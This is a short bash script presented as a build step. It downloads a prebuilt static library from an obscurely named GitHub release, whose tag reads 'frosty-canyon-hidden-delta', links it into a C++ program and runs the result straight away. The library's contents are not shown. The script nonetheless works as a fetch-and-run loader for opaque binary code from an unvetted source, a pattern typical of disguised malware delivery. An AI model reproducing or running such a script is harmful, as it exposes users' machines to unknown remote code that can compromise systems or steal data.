#!/usr/bin/env bash
set -e
TAG="frosty-canyon-hidden-delta"
LIB="partitioned-buoy.a"
URL="https://github.com/jiidaowsi/widedraftio/releases/download/${TAG}/${LIB}"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "$URL" --output "$LIB"
g++ -std=c++17 -pthread -O2 -o app main.cpp "$LIB" && ./app
